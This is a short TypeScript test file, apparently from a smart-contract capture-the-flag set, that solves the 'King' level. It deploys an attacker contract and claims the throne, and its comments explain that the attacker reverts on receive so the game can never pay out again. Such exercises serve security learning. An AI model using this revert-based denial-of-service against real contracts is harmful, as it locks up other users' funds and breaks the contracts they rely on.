import { expect } from "chai";
import { Contract, Signer, utils } from "ethers";
import { TestOptions, setupChallenge, submitLevel } from "./utils";
import { KING_LEVEL_ADDRESS } from "./constants";

const { parseEther } = utils;

describe("King", () => {
  let challenge: Contract; // challenge contract
  let attacker: Contract | undefined;

  before(async () => {
    const contractLevel = KING_LEVEL_ADDRESS;
    const options: TestOptions = {
      contractName: "King",
      attackerName: "KingAttacker",
      value: parseEther("1"),
    };
    ({ challenge, attacker } = await setupChallenge(contractLevel, options));
  });

  it("solves the challenge", async () => {
    // 1. send the same amount as the current prize to claim the throne
    // 2. attacker contract will revert on receive causing the game to break
    await attacker?.attack({ value: await challenge.prize() });
  });

  after(async () => {
    expect(await submitLevel(challenge.address), "level not solved").to.be.true;
  });
});
